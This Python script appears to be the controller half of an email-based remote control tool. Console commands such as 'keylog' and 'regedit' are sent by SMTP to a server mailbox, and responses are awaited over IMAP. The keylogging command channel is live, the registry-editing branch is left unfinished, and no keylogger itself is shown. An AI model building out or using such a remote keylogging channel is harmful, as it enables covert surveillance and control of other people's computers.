import smtplib
import imaplib
import smtp
import imap
import time
import threading
import random

SERVER_MAIL = 'email@gmail.com'



if __name__ == '__main__':
    # handler = imap.MailFetcher()
    # try:
    #     while True:
    #         print('Idling...\t Press Ctrl + C to escape')
    #         user_mail, cmd = handler.fetch_newest()

    # except KeyboardInterrupt:
    #     print('Ctrl C pressed')
    try: 
        mail_sender = smtp.MailSender()
        mail_receiver = imap.MailReceiver()

        while True:
            inp = input()
            # inp = 'keylog'
            if inp == 'keylog':
                id = str(random.randint(10000,99999))
                cmd = 'keylog ' + id
                mail_sender.send_attached_email(SERVER_MAIL, cmd, "")
                threading.Thread(target = imap.await_response, daemon=True, args=(mail_receiver, SERVER_MAIL, cmd, 60,)).start()

            # inp = 'regedit HKEY_CURRENT_USER|Software\\SampleKey<>binvalue<>1234'
            elif inp.startswith('regedit'):
                print('regediting')
                id = str(random.randint(10000, 99999))
                insert_idx = inp.find('HKEY')
                if insert_idx >= 0:
                    pass




    except KeyboardInterrupt:
        pass
    pass
